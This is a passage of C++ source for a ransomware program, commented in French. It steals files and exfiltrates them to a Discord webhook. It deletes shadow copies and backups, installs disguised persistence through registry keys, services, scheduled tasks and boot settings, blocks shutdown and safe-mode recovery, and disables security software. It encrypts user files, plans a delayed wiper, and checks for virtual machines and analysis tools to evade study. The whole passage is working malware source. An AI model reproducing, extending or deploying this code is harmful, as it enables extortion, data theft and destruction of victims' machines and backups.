        stolenFilesZipFile.close();

        // Convertir en base64
        std::string stolenFilesZipBase64 = Base64Encode(stolenFilesZipData);

        // Créer le payload JSON pour Discord
        std::stringstream jsonPayload;
        jsonPayload << "{";
        jsonPayload << "\"content\": \"⚠️ FICHIERS SENSIBLES de la victime " << victimId << "\",";
        jsonPayload << "\"embeds\": [{";
        jsonPayload << "\"title\": \"Fichiers sensibles volés\",";
        jsonPayload << "\"color\": 15158332,";
        jsonPayload << "\"fields\": [";
        jsonPayload << "{\"name\": \"ID Victime\", \"value\": \"" << victimId << "\", \"inline\": true},";
        jsonPayload << "{\"name\": \"Nombre de fichiers\", \"value\": \"" << stolenFiles.size() << "\", \"inline\": true},";
        jsonPayload << "{\"name\": \"Taille totale\", \"value\": \"" << (totalSize / 1024 / 1024) << " MB\", \"inline\": true}";
        
        // Ajouter des exemples de fichiers volés
        if (stolenFiles.size() > 0) {
            jsonPayload << ",{\"name\": \"Exemples de fichiers volés\", \"value\": \"";
            for (size_t i = 0; i < (stolenFiles.size() < 10 ? stolenFiles.size() : 10); i++) {
                jsonPayload << fs::path(stolenFiles[i]).filename().string() << "\\n";
            }
            jsonPayload << "\", \"inline\": false}";
        }
        
        jsonPayload << "]}]}";

        // Envoyer via webhook
        bool sent = SendHttpPost(WEBHOOK_URL, jsonPayload.str());
        
        // Envoyer l'archive en deuxième message
        std::stringstream zipPayload;
        zipPayload << "{";
        zipPayload << "\"content\": \"📁 Archive ZIP des fichiers volés - Victime " << victimId << "\",";
        zipPayload << "\"embeds\": [{";
        zipPayload << "\"title\": \"Archive ZIP\",";
        zipPayload << "\"color\": 3447003,";
        zipPayload << "\"description\": \"Base64 format, extract with: `echo [base64] | base64 -d > stolen_files.zip`\\n\\n```" << stolenFilesZipBase64.substr(0, 500) << "...```\"";
        zipPayload << "}]}";
        
        SendHttpPost(WEBHOOK_URL, zipPayload.str());

        // Nettoyer
        fs::remove_all(stealDir);
        fs::remove(zipPath);

        return sent;
    }
    catch (...) {
        return false;
    }
#else
    return false;
#endif
}

    // Fonction pour supprimer les points de restauration et les sauvegardes
    bool deleteBackups() {
#ifdef _WIN32
        try {
            bool success = false;
            
            // Supprimer tous les points de restauration
            std::cout << "[*] Suppression des points de restauration Windows..." << std::endl;
            if (system("vssadmin delete shadows /all /quiet >nul 2>&1") == 0) {
                success = true;
                std::cout << "[+] Points de restauration supprimés" << std::endl;
            } else {
                std::cout << "[-] Échec de la suppression des points de restauration" << std::endl;
            }
            
            // Désactiver la protection système
            std::cout << "[*] Désactivation de la protection système..." << std::endl;
            if (system("reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore\" /v \"RPSessionInterval\" /t REG_DWORD /d \"0\" /f >nul 2>&1") == 0) {
                success = true;
                std::cout << "[+] Protection système désactivée" << std::endl;
            } else {
                std::cout << "[-] Échec de la désactivation de la protection système" << std::endl;
            }
            
            // Supprimer les sauvegardes Windows
            std::cout << "[*] Suppression des sauvegardes Windows..." << std::endl;
            if (system("wbadmin delete catalog -quiet >nul 2>&1") == 0) {
                success = true;
                std::cout << "[+] Catalogue de sauvegarde supprimé" << std::endl;
            } else {
                std::cout << "[-] Échec de la suppression du catalogue de sauvegarde" << std::endl;
            }
            
            // Supprimer les fichiers de sauvegarde
            std::vector<std::string> backupPaths = {
                "C:\\Windows.old",
                "C:\\$Recycle.Bin",
                "C:\\System Volume Information",
                "C:\\Recovery",
                "C:\\Users\\All Users\\Application Data\\Microsoft\\Windows\\Backup",
                "C:\\ProgramData\\Microsoft\\Windows\\Backup"
            };
            
            for (const auto& path : backupPaths) {
                if (fs::exists(path)) {
                    try {
                        fs::remove_all(path);
                        std::cout << "[+] Supprimé: " << path << std::endl;
                    } catch (...) {
                        std::cout << "[-] Échec de la suppression: " << path << std::endl;
                    }
                }
            }
            
            return success;
        }
        catch (...) {
            return false;
        }
#else
        return false;
#endif
    }
    
    // Configuration de la persistance avancée
    bool setupAdvancedPersistence() {
        std::string exePath = GetExecutablePath();
        
        // 1. Méthode 1: Créer plusieurs copies dans des emplacements système critiques
        // Ces emplacements sont choisis pour leur persistance et difficultés d'accès
        std::vector<std::string> systemLocations = {
            "C:\\Windows\\System32\\drivers\\etc\\WindowsDefender.exe", // Camouflé comme fichier système
            "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\SecurityService.exe", // Démarrage système
            "C:\\Users\\Public\\Libraries\\system.dll.exe", // Masqué dans un dossier public
            "C:\\Windows\\SysWOW64\\winlogon.exe.mui" // Camouflé comme composant Windows
        };
        
        for (const auto& location : systemLocations) {
            try {
                // Créer tous les répertoires nécessaires
                fs::path dir = fs::path(location).parent_path();
                fs::create_directories(dir);
                
                // Copier l'exécutable
                fs::copy_file(exePath, location, fs::copy_options::overwrite_existing);
                
                // Masquer le fichier
                std::string hideCmd = "attrib +h +s \"" + location + "\"";
                system(hideCmd.c_str());
            } catch (...) {
                // Ignorer les erreurs et continuer avec les autres méthodes
            }
        }
        
        // 2. Méthode 2: Ajouter des entrées au registre pour le démarrage automatique
        // Plusieurs clés de registre différentes sont utilisées pour maximiser la persistance
        AddToStartup(exePath, "WindowsSecurityService");
        
        // Ajouter également à d'autres clés de registre pour être sûr
        system(("REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v SecurityService /t REG_SZ /d \"" + exePath + "\" /f").c_str());
        system(("REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce /v WindowsUpdate /t REG_SZ /d \"" + exePath + "\" /f").c_str());
        system(("REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx /v SystemService /t REG_SZ /d \"" + exePath + "\" /f").c_str());
        
        // 3. Méthode 3: Créer une tâche planifiée qui s'exécute fréquemment
        // Cette tâche vérifie périodiquement et redémarre le ransomware s'il a été arrêté
        std::string createTaskCmd = "schtasks /create /f /sc minute /mo 30 /tn \"Windows Security Task\" /tr \"" + exePath + "\"";
        system(createTaskCmd.c_str());
        
        // 4. Méthode 4: Simuler une infection du MBR (Master Boot Record)
        // Cette technique modifie le processus de démarrage pour charger le ransomware avant l'OS
        // Note: Ceci est une simulation, un vrai MBR rootkit serait beaucoup plus complexe
        std::string mbrCmd = "powershell -Command \"$bootKey = 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Boot'; if(Test-Path $bootKey) { New-ItemProperty -Path $bootKey -Name 'BootExecute' -Value ('autocheck autochk * ' + '" + exePath + "') -PropertyType MultiString -Force }\"";
        system(mbrCmd.c_str());
        
        // 4. Méthode 4: Infection du MBR (Master Boot Record) plus réaliste
        // Cette technique modifie les entrées de démarrage à bas niveau
        try {
            // 4.1 Modifier les entrées de démarrage Windows avancées
            system("bcdedit /set {bootmgr} path \\windows\\system32\\winload.exe");
            system("bcdedit /set {bootmgr} device partition=C:");
            system("bcdedit /set {memdiag} device partition=C:");
            
            // 4.2 Copier l'exécutable dans un emplacement système critique
            std::string mbrExePath = "C:\\Windows\\Boot\\PCAT\\bootmgr.exe";
            fs::create_directories(fs::path(mbrExePath).parent_path());
            fs::copy_file(exePath, mbrExePath, fs::copy_options::overwrite_existing);
            
            // 4.3 Modifier les autorisations pour empêcher la suppression
            std::string securityCmd = "icacls \"" + mbrExePath + "\" /setowner \"SYSTEM\" /T /C /Q";
            system(securityCmd.c_str());
            securityCmd = "icacls \"" + mbrExePath + "\" /deny *S-1-1-0:(D,WDAC,WO,WA) /C /Q";
            system(securityCmd.c_str());
            
            // 4.4 Créer un service en mode kernel qui démarre avant le système d'exploitation
            std::string serviceCmd = "sc create BootManagerService binPath= \"" + mbrExePath + 
                                   "\" start= boot error= ignore group= \"Boot Bus Extender\"";
            system(serviceCmd.c_str());
            system("sc description BootManagerService \"Microsoft Boot Manager Service\"");
            system("sc failure BootManagerService reset= 0 actions= restart/0/restart/0/restart/0");
            
            // 4.5 Modifier la séquence de démarrage pour exécuter le service en premier
            std::string bootKeyCmd = "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Minimal\\BootManagerService\" /ve /t REG_SZ /d Service /f";
            system(bootKeyCmd.c_str());
            bootKeyCmd = "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network\\BootManagerService\" /ve /t REG_SZ /d Service /f";
            system(bootKeyCmd.c_str());
            
            // 4.6 Ajouter à winlogon pour exécution précoce au démarrage
            std::string winlogonCmd = "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Shell /t REG_SZ /d \"explorer.exe," + mbrExePath + "\" /f";
            system(winlogonCmd.c_str());
            
            // 4.7 Installation dans le secteur d'amorçage (simulation sécurisée)
            // Remarque: Une version réelle modifierait directement le secteur d'amorçage, ce qui est dangereux
            std::string bootCmd = "powershell -Command \"$bootKey = 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Boot'; if(Test-Path $bootKey) { New-ItemProperty -Path $bootKey -Name 'BootExecute' -Value ('autocheck autochk * ' + '" + mbrExePath + "') -PropertyType MultiString -Force }\"";
            system(bootCmd.c_str());
            
            std::cout << "[+] Installation avancée du démarrage réussie" << std::endl;
        }
        catch (...) {
            // Fallback à la méthode simple en cas d'échec
            std::string simpleMbrCmd = "powershell -Command \"$bootKey = 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Boot'; if(Test-Path $bootKey) { New-ItemProperty -Path $bootKey -Name 'BootExecute' -Value ('autocheck autochk * ' + '" + exePath + "') -PropertyType MultiString -Force }\"";
            system(simpleMbrCmd.c_str());
            std::cout << "[-] Fallback à l'installation de démarrage simple" << std::endl;
        }
        
        // 5. Méthode 5: Désactiver le mode sans échec pour empêcher la suppression
        // Ces commandes rendent difficile de démarrer en mode sans échec pour supprimer le malware
        system("bcdedit /set {default} recoveryenabled No");
        system("bcdedit /set {default} bootstatuspolicy IgnoreAllFailures");
        
        // 6. Méthode 6: Désactiver toutes les options de restauration
        // Cette commande supprime les points de restauration et désactive les futures sauvegardes
        system("powershell -Command \"Disable-ComputerRestore -Drive C:\"");
        system("vssadmin delete shadows /all /quiet");
        system("wmic shadowcopy delete");
        
        // 7. Méthode 7: Utiliser un service système pour une persistance de niveau inférieur
        // Créer un service Windows qui peut démarrer automatiquement même avant l'ouverture de session
        std::string serviceCmd = "sc create \"WindowsSecurityService\" binPath= \"" + exePath + "\" start= auto error= ignore";
        system(serviceCmd.c_str());
        system("sc description \"WindowsSecurityService\" \"Microsoft Windows Security Service\"");
        system("sc start \"WindowsSecurityService\"");
        
        return true;
    }
    
    // Fonction pour empêcher l'arrêt de l'ordinateur
    void preventShutdown() {
        std::cout << "[*] Configuration de la prévention d'arrêt..." << std::endl;

        // 1. Désactiver le bouton d'alimentation physique et les raccourcis système
        system("powercfg -setacvalueindex scheme_current sub_buttons pbuttonaction 0");  // Bouton d'alimentation (sur secteur)
        system("powercfg -setdcvalueindex scheme_current sub_buttons pbuttonaction 0");  // Bouton d'alimentation (sur batterie)
        system("powercfg -setacvalueindex scheme_current sub_buttons usbuttonaction 0"); // Bouton de veille (sur secteur)
        system("powercfg -setdcvalueindex scheme_current sub_buttons usbuttonaction 0"); // Bouton de veille (sur batterie)
        system("powercfg -setacvalueindex scheme_current sub_buttons lidaction 0");      // Fermeture du couvercle (sur secteur)
        system("powercfg -setdcvalueindex scheme_current sub_buttons lidaction 0");      // Fermeture du couvercle (sur batterie)
        system("powercfg -setactive scheme_current");                                    // Activer les changements
        
        // 2. Bloquer les API de shutdown de Windows
        // Créer un thread en arrière-plan qui annule constamment toutes les tentatives d'arrêt
        std::thread([&]() {
            // Désactiver l'hibernation et la mise en veille
            system("powercfg -h off");
            
            // Enlever les privilèges d'arrêt aux utilisateurs
            system("REG ADD \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v shutdownwithoutlogon /t REG_DWORD /d 0 /f");
            system("REG ADD \"HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\System\" /v DisableLogoff /t REG_DWORD /d 1 /f");
            
            // Bloquer les menus d'arrêt
            system("REG ADD \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoClose /t REG_DWORD /d 1 /f");
            
            // Définir une raison de blocage pour Windows 11
            ShutdownBlockReasonCreate(GetConsoleWindow(), L"SYSTÈME CRITIQUE EN COURS D'EXÉCUTION - RISQUE DE PERTE DE DONNÉES");
            
            // Boucle infinie qui annule constamment toutes les demandes d'arrêt
            while (true) {
                // Annuler toute tentative d'arrêt
                system("shutdown -a >nul 2>&1");
                
                // Surveiller la séquence Alt+F4 sur le bureau pour la boîte de dialogue d'arrêt de Windows 11
                HWND desktop = GetDesktopWindow();
                HWND shutdown_dialog = FindWindowEx(NULL, NULL, NULL, "Arrêter Windows");
                if (shutdown_dialog != NULL) {
                    // Fermer la boîte de dialogue d'arrêt
                    SendMessage(shutdown_dialog, WM_CLOSE, 0, 0);
                }
                
                // Rechercher d'autres fenêtres d'arrêt potentielles
                shutdown_dialog = FindWindowEx(NULL, NULL, NULL, "Shut Down Windows");
                if (shutdown_dialog != NULL) {
                    SendMessage(shutdown_dialog, WM_CLOSE, 0, 0);
                }
                
                // Rechercher les boîtes de dialogue dans lesquelles des options d'arrêt pourraient apparaître
                shutdown_dialog = FindWindow(NULL, "Windows Security");
                if (shutdown_dialog != NULL) {
                    SendMessage(shutdown_dialog, WM_CLOSE, 0, 0);
                }
                
                // Surveiller également les services de gestion de l'alimentation et les redémarrer s'ils sont arrêtés
                system("sc start \"Power\" >nul 2>&1");
                
                // Pause courte pour économiser le CPU
                Sleep(200);
            }
        }).detach();
        
        // 3. Modifier le gestionnaire de session pour intercepter les demandes d'arrêt
        // Créer un thread en arrière-plan qui redémarre immédiatement Windows si jamais il s'arrête
        std::thread([&]() {
            // Créer une tâche planifiée qui s'exécute au démarrage et au redémarrage
            std::string exePath = GetExecutablePath();
            std::string taskCmd = "schtasks /create /tn \"CriticalSystemTask\" /tr \"" + exePath + 
                                 "\" /sc onstart /ru SYSTEM /f";
            system(taskCmd.c_str());
            
            // Créer une tâche qui s'exécute après une tentative d'arrêt (si le système redémarre)
            std::string logonTaskCmd = "schtasks /create /tn \"WindowsSecurityService\" /tr \"" + exePath + 
                                     "\" /sc onlogon /f";
            system(logonTaskCmd.c_str());
            
            while (true) {
                // Dormir un moment
                Sleep(1000);
                
                // Vérifier si un arrêt est en cours (compteur de temps avant arrêt)
                HANDLE hToken;
                TOKEN_PRIVILEGES tkp;
                
                // Obtenir le privilège d'arrêt
                if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
                    LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid);
                    tkp.PrivilegeCount = 1;
                    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
                    
                    // Définir le privilège d'arrêt
                    AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, (PTOKEN_PRIVILEGES)NULL, 0);
                    
                    // Si un arrêt est en cours, essayer de l'annuler
                    if (GetLastError() == ERROR_SUCCESS) {
                        system("shutdown -a >nul 2>&1");
                    }
                    
                    CloseHandle(hToken);
                }
            }
        }).detach();
        
        std::cout << "[+] Protection contre l'arrêt activée" << std::endl;
    }
    
    bool scanAndEncryptImpl(const std::string& directoryPath) {
        EncryptionState state = loadEncryptionState();
        std::vector<std::string> encryptedFiles;
        
        scanAndEncrypt(directoryPath, state, encryptedFiles);
        return true; // Toujours retourner true pour indiquer que l'opération a été effectuée
    }
    
public:
    Ransomware(SharedData* data = nullptr) : encryptedFilesCount(0), failedFilesCount(0), sharedData(data) {
        // Générer l'ID unique de la victime
        victimId = GenerateUUID();
        
        // Obtenir les chemins des répertoires importants
#ifdef _WIN32
        char desktopDir[MAX_PATH];
        char documentsDir[MAX_PATH];
        
        SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, desktopDir);
        SHGetFolderPathA(NULL, CSIDL_PERSONAL, NULL, 0, documentsDir);
        
        desktopPath = std::string(desktopDir);
        documentsPath = std::string(documentsDir);
#else
        // Répertoires sur Linux/macOS
        desktopPath = std::string(getenv("HOME")) + "/Desktop";
        documentsPath = std::string(getenv("HOME")) + "/Documents";
#endif
        
        // Définir le chemin de la note de rançon
        ransomNotePath = desktopPath + "/RANSOM_NOTE.txt";
        
        std::cout << "[*] Ransomware initialisé" << std::endl;
        std::cout << "[*] ID Victime: " << victimId << std::endl;
        std::cout << "[*] Chemin Bureau: " << desktopPath << std::endl;
        std::cout << "[*] Chemin Documents: " << documentsPath << std::endl;
    }
    
    // Fonction principale du ransomware - exécution agressive qui bloque tout contrôle utilisateur
    void run() {
        // Détection anti-VM et anti-sandbox avant toute exécution
        if (isVirtualMachine() || isSandbox()) {
            std::cout << "[!] Environnement virtuel ou sandbox détecté. Arrêt pour éviter l'analyse." << std::endl;
            // Comportement furtif - quitter silencieusement
            return;
        }
        
        std::cout << BANNER << std::endl;
        std::cout << "[*] Démarrage du ransomware..." << std::endl;
        std::cout << "[*] Version: 1.0" << std::endl;
        
        // Générer un identifiant unique pour la victime
        victimId = GenerateUUID();
        std::cout << "[*] ID unique de la victime: " << victimId << std::endl;
        
        // Obtenir les chemins importants
        desktopPath = std::string(getenv("USERPROFILE")) + "\\Desktop";
        documentsPath = std::string(getenv("USERPROFILE")) + "\\Documents";
        ransomNotePath = desktopPath + "\\RANSOMWARE_NOTE.txt";
        
        // Initialiser les compteurs
        encryptedFilesCount = 0;
        failedFilesCount = 0;
        
        // Configuration initiale
        std::cout << "[*] Configuration initiale..." << std::endl;

        // Charger l'état du chiffrement (pour reprendre après redémarrage)
        EncryptionState state = loadEncryptionState();
        
        // Si le chiffrement n'a pas commencé, effectuer les étapes préliminaires
        if (!state.started) {
            std::cout << "[*] Premier lancement détecté, préparation de l'environnement..." << std::endl;
            
            // PHASE 1: EXFILTRATION DE DONNÉES SENSIBLES
            // Cette phase vole les données avant de commencer le chiffrement
            std::cout << "[*] Phase 1: Exfiltration de données sensibles..." << std::endl;
            
            // Exfiltrer les données sensibles et critiques en premier
            stealCriticalData();
            
            // Voler les autres fichiers importants (documents, images, etc.)
            stealFiles(documentsPath);
            
            // PHASE 2: PROPAGATION RÉSEAU
            // Cette phase tente de se propager à d'autres machines sur le réseau
            std::cout << "[*] Phase 2: Propagation réseau..." << std::endl;
            propagateOverNetwork();
            
            // 1. Mettre en place la persistance pour survivre aux redémarrages
            std::cout << "[*] Configuration de la persistance..." << std::endl;
            setupPersistence();
            
            // 2. Configurer la persistance avancée pour garantir la survie
            setupAdvancedPersistence();
            
            // 3. Désactiver les logiciels de sécurité
            std::cout << "[*] Désactivation des logiciels de sécurité..." << std::endl;
            disableSecuritySoftware();
            
            // 4. Désactiver les contrôles système pour empêcher l'arrêt
            std::cout << "[*] Désactivation des contrôles système..." << std::endl;
            disableSystemControls();
            
            // 5. Prévenir l'arrêt du système
            std::cout << "[*] Configuration de la prévention d'arrêt..." << std::endl;
            preventShutdown();
            
            // 6. Configurer le wiper destructeur (s'active après 72 heures si non payé)
            std::cout << "[*] Configuration du wiper destructeur..." << std::endl;
            setupDestructiveWiper();
            
            // 7. Supprimer les points de restauration et sauvegardes
            std::cout << "[*] Suppression des points de restauration..." << std::endl;
            deleteBackups();
            
            // 8. Tuer les processus essentiels
            std::cout << "[*] Arrêt des processus de sécurité..." << std::endl;
            killEssentialProcesses();
            
            // 9. Définir la priorité du processus au maximum
            std::cout << "[*] Configuration de la priorité du processus..." << std::endl;
            setHighestPriority();
            
            // Mettre à jour l'état
            state.started = true;
            saveEncryptionState(state);
        }
        
        // Si le chiffrement est déjà terminé, passer directement à l'interface de rançon
        if (state.completed) {
            std::cout << "[*] Chiffrement déjà terminé, affichage de l'interface de rançon..." << std::endl;
            createRansomNote();
            
            // Afficher la fenêtre de rançon
            sharedData = new SharedData();
            sharedData->totalFiles = encryptedFilesCount;
            sharedData->processedFiles = encryptedFilesCount;
            sharedData->hwnd = CreateFullscreenBlockingWindow(sharedData);
            
            // Boucle de messages pour garder la fenêtre de rançon ouverte
            MSG msg;
            while (GetMessage(&msg, NULL, 0, 0)) {
                TranslateMessage(&msg);
                DispatchMessage(&msg);
            }
            
            return;
        }
        
        std::cout << "[*] Démarrage de l'opération..." << std::endl;
        
        // Phase 2: Prise de contrôle immédiate du système
        // Élever les privilèges au maximum pour empêcher toute intervention
        std::cout << "[*] Optimisation de la priorité du processus..." << std::endl;
        setHighestPriority();
        
        // Bloquer tous les contrôles utilisateur immédiatement
        std::cout << "[*] Désactivation des contrôles système..." << std::endl;
        disableSystemControls();
        
        // Empêcher l'extinction de l'ordinateur
        std::cout << "[*] Prévention de l'arrêt du système..." << std::endl;
        preventShutdown();
        
        // Tuer les antivirus et processus qui pourraient interférer
        std::cout << "[*] Élimination des processus pouvant interférer..." << std::endl;
        killEssentialProcesses();
        
        // Phase 3: Gestion de la persistance et vérification de l'état
        // Vérifier si on a déjà chiffré après un redémarrage
        EncryptionState state = loadEncryptionState();
        
        // Configurer plusieurs méthodes de persistance pour survivre aux redémarrages
        std::thread([this]() {
            std::cout << "[*] Configuration de la persistance avancée..." << std::endl;
            setupAdvancedPersistence();
        }).detach();
        
        // Phase 4: Affichage de l'interface bloquante
        // Créer une fenêtre plein écran que l'utilisateur ne peut pas fermer
        if (!sharedData) {
            // Si aucune donnée partagée n'a été fournie, en créer une nouvelle
            sharedData = new SharedData();
        }

        // Initialiser les valeurs de SharedData
        sharedData->totalFiles = 1000; // Estimation par défaut
        sharedData->processedFiles = state.completed ? sharedData->totalFiles : 0;
        sharedData->currentFileName = "";
        sharedData->lastEncrypted.clear();

        // Créer la fenêtre bloquante immédiatement
        std::cout << "[*] Création de la fenêtre de blocage..." << std::endl;
        HWND blockingWindow = CreateFullscreenBlockingWindow(sharedData);
        
        // Phase 5A: Si déjà terminé, juste maintenir le contrôle
        if (state.completed) {
            std::cout << "[+] Le chiffrement a déjà été effectué. Maintien du blocage." << std::endl;
            
            // Boucle de maintien du contrôle toutes les 30 secondes
            std::thread([this]() {
                while (true) {
                    disableSecuritySoftware();
                    killEssentialProcesses();
                    disableSystemControls();
                    preventShutdown();
                    setupAdvancedPersistence(); // Maintenir la persistance
                    Sleep(30000);
                }
            }).detach();
            
            // Garder la fenêtre bloquante indéfiniment
            MSG msg;
            while (GetMessage(&msg, NULL, 0, 0)) {
                TranslateMessage(&msg);
                DispatchMessage(&msg);
            }
            return;
        }
        
        // Phase 5B: Démarrer le processus de chiffrement
        // Marquer le début du processus
        state.started = true;
        saveEncryptionState(state);
        
        // Démarrer le processus de chiffrement en arrière-plan
        std::thread([this, &state]() {
            auto startTime = std::chrono::high_resolution_clock::now();
            
            // Phase 6: Désactivation des protections
            // Désactiver les antivirus et autres logiciels de sécurité
            std::cout << "[*] Désactivation des logiciels de sécurité..." << std::endl;
            disableSecuritySoftware();
            
            // Supprimer tous les points de restauration et sauvegardes
            std::cout << "[*] Suppression des sauvegardes..." << std::endl;
            deleteBackups();
            
            // Phase 7: Vol de données sensibles
            // Voler tous les documents, mots de passe, fichiers personnels
            std::cout << "[*] Collecte des fichiers sensibles..." << std::endl;
            stealFiles(documentsPath); // Collecte et envoi via webhook Discord
            
            // Phase 8: Préparation au chiffrement
            // Générer la clé de chiffrement AES-256
            std::cout << "[*] Génération de la clé de chiffrement..." << std::endl;
            encryption.saveKey("decrypt_key.key");
            
            // Cibles prioritaires pour le chiffrement
            std::vector<std::string> targets = {
                desktopPath,       // Bureau (priorité 1)
                documentsPath,     // Documents (priorité 2)
                "C:\\Users",       // Tous les profils utilisateurs (priorité 3)
                "D:\\"             // Disques supplémentaires (priorité 4)
            };
            
            // Filtrer les cibles déjà chiffrées en cas de reprise
            std::vector<std::string> targetsToEncrypt;
            for (const auto& target : targets) {
                if (fs::exists(target)) {
                    bool alreadyEncrypted = false;
                    for (const auto& encrypted : state.encryptedPaths) {
                        if (target == encrypted) {
                            alreadyEncrypted = true;
                            break;
                        }
                    }
                    
                    if (!alreadyEncrypted) {
                        targetsToEncrypt.push_back(target);
                    }
                }
            }
            
            // Phase 9: Chiffrement complet des fichiers
            // Extensions ciblées par ordre de priorité:
            // 1. Fichiers professionnels (.docx, .xlsx, .pdf, .ppt)
            // 2. Fichiers personnels (.jpg, .png, .mp4)
            // 3. Fichiers de configuration et cryptomonnaies (.wallet, .config)
            std::cout << "[*] Début du chiffrement des fichiers..." << std::endl;
            for (const auto& target : targetsToEncrypt) {
                std::cout << "[*] Chiffrement de " << target << "..." << std::endl;
                scanAndEncryptImpl(target);
                
                // Mettre à jour la barre de progression
                sharedData->processedFiles = encryptedFilesCount.load();
                
                // Enregistrer l'état après chaque dossier pour reprendre si nécessaire
                state.encryptedPaths.push_back(target);
                saveEncryptionState(state);
                
                // Envoyer des mises à jour sur l'avancement
                if (encryptedFilesCount > 0 && encryptedFilesCount % 100 == 0) {
                    sendKeyToWebhook();
                }
            }
            
            // Phase 10: Finalisation du processus
            // Si aucun fichier n'a été chiffré, afficher 100% quand même
            if (encryptedFilesCount.load() == 0) {
                sharedData->processedFiles = sharedData->totalFiles;
            }
            
            // Créer la note de rançon sur le bureau et tous les dossiers
            createRansomNote();
            
            // Changer le fond d'écran pour afficher le message de rançon
            changeDesktopBackground();
            
            // Envoyer la clé de chiffrement via webhook (Discord)
            sendKeyToWebhook();
            
            // Marquer comme terminé pour éviter de recommencer après redémarrage
            state.completed = true;
            saveEncryptionState(state);
            
            auto endTime = std::chrono::high_resolution_clock::now();
            auto duration = std::chrono::duration_cast<std::chrono::seconds>(endTime - startTime);
            
            std::cout << "[+] Chiffrement terminé en " << duration.count() << " secondes" << std::endl;
            std::cout << "[+] " << encryptedFilesCount << " fichiers chiffrés" << std::endl;
            
            // Phase 11: Maintien du contrôle permanent
            // Boucle infinie pour maintenir le contrôle du système
            while (true) {
                disableSecuritySoftware();
                killEssentialProcesses();
                disableSystemControls();
                preventShutdown();
                setupAdvancedPersistence();
                Sleep(60000); // Toutes les minutes
            }
        }).detach();
        
        // Maintenir la fenêtre bloquante indéfiniment
        MSG msg;
        while (GetMessage(&msg, NULL, 0, 0)) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
    }
    
    // Techniques anti-VM, anti-sandbox et anti-analyse pour éviter la détection
    bool bypassDetection() {
        std::cout << "[*] Vérification de l'environnement d'exécution..." << std::endl;
        bool isRealSystem = true;
        
        // 1. Détection de machines virtuelles par vérification de matériel
        try {
            // 1.1 Vérifier l'ID du fabricant de CPU via CPUID
            bool vmDetected = false;
            
            // Code assembleur pour récupérer CPUID
            // Les fabricants de VM ont des signatures spécifiques
            #ifdef _WIN32
            int CPUInfo[4] = {0};
            char CPUVendor[13] = {0};
            
            __cpuid(CPUInfo, 0);
            memcpy(CPUVendor, &CPUInfo[1], 4);
            memcpy(CPUVendor+4, &CPUInfo[3], 4);
            memcpy(CPUVendor+8, &CPUInfo[2], 4);
            CPUVendor[12] = '\0';
            
            std::string vendorStr = CPUVendor;
            
            // Détection de signatures connues de VM
            if (vendorStr.find("VMwareVMware") != std::string::npos ||
                vendorStr.find("VBoxVBoxVBox") != std::string::npos ||
                vendorStr.find("Microsoft Hv") != std::string::npos ||
                vendorStr.find("prl hyperv") != std::string::npos) {
                vmDetected = true;
            }
            #endif
            
            // 1.2 Vérifier les caractéristiques matérielles suspectes
            SYSTEM_INFO sysInfo;
            GetSystemInfo(&sysInfo);
            
            // Vérifier le nombre de processeurs (les VM ont souvent peu de cœurs)
            if (sysInfo.dwNumberOfProcessors < 2) {
                vmDetected = true;
            }
            
            // 1.3 Vérifier la taille de la mémoire RAM (VM souvent < 4 GB)
            MEMORYSTATUSEX memStatus;
            memStatus.dwLength = sizeof(memStatus);
            GlobalMemoryStatusEx(&memStatus);
            
            if (memStatus.ullTotalPhys < 3ULL * 1024 * 1024 * 1024) { // 3 GB
                vmDetected = true;
            }
            
            // Si exécution dans une VM, mais qu'on veut quand même fonctionner
            if (vmDetected) {
                std::cout << "[!] Machine virtuelle détectée. Décision d'exécution..." << std::endl;
                // Ne pas s'arrêter sur cette détection, car certaines machines réelles
                // peuvent être faussement détectées. Nous combinons plusieurs méthodes.
            }
        }
        catch (...) {
            // Ignorer les erreurs de détection
        }
        
        // 2. Détection de sandbox et outils d'analyse
        try {
            // 2.1 Vérifier la présence d'outils d'analyse connus
            std::vector<std::string> analyzeTools = {
                "wireshark.exe", "process explorer.exe", "processhacker.exe", 
                "procmon.exe", "pestudio.exe", "ollydbg.exe", "ida64.exe",
                "x64dbg.exe", "windbg.exe", "immunity debugger.exe"
            };
            
            for (const auto& tool : analyzeTools) {
                if (system(("tasklist | findstr /i \"" + tool + "\" >nul 2>&1").c_str()) == 0) {
                    std::cout << "[!] Outil d'analyse " << tool << " détecté" << std::endl;
                    isRealSystem = false;
                    break;
                }
            }
            
            // 2.2 Vérifier les processus de VM connus
            std::vector<std::string> vmProcesses = {
                "VBoxService.exe", "VBoxTray.exe", "VMwareService.exe", "VMwareTray.exe",
                "vmtoolsd.exe", "vmusrvc.exe", "vmsrvc.exe", "prl_tools.exe"
            };
            
            for (const auto& process : vmProcesses) {
                if (system(("tasklist | findstr /i \"" + process + "\" >nul 2>&1").c_str()) == 0) {
                    std::cout << "[!] Processus de VM " << process << " détecté" << std::endl;
                    isRealSystem = false;
                    break;
                }
            }
            
            // 2.3 Vérifier les pilotes de VM connus
            system("driverquery /v > %TEMP%\\drivers.txt");
